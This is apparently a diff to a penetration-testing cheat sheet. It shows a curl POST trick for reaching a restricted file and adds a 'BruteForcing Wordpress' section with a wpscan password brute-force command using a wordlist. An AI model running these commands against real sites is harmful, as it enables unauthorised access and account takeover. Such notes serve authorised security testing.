@@ -405,3 +405,8 @@ https://www.nds.ruhr-uni-bochum.de/media/ei/arbeiten/2017/01/30/exploiting-print
 ```
 curl -H "Content-Length:0" -X POST https://<domain>/restricted_file
 ```
+
+### BruteForcing Wordpress
+```
+wpscan -U <username> -P wordlist.txt --url http://url/wordpress
+```
